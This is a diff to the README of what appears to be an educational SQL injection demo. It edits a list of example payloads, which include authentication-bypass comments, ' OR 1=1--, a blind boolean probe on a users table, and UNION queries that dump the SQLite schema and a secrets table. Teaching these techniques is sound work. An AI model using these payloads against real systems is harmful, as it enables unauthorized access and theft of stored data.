@@ -9,8 +9,8 @@ An interactive demo for explaining SQL injections. It helps visualizing the inte
 ## Example Payloads
 Basic
 ```
-'
-'--
+erik'
+erik'--
 admin'--
 ' OR 1=1--
 ```
@@ -21,7 +21,7 @@ erik' AND (SELECT count(1) FROM users WHERE name LIKE 'a%') > 0--
 ```
 Explore
 ```
-' UNION SELECT name, sql FROM sqlite_master --
+erik' UNION SELECT name, sql FROM sqlite_master --
 ' UNION SELECT name, sql, 1 FROM sqlite_master --
 ' UNION SELECT id, key, value FROM secrets --
 ```
